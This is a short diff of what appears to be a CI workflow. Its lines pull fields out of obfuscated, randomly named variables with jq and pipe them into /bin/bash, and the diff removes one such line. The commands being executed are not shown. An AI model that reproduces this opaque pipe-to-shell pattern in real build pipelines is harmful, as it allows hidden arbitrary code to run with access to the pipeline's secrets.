@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$oklra8348" | jq -r .cg98619 | /bin/bash
           echo $sskx42184 | jq -r .qafn2 | /bin/bash
           printf '%s' "$r9" | jq -r .cfc81791 | /bin/bash
-          echo $o51 | jq -r .n07 | /bin/bash
           echo $fuls606 | jq -r .map059 | /bin/bash
           echo $jew53 | jq -r .u71 | /bin/bash
           echo $f6841 | jq -r .v97 | /bin/bash
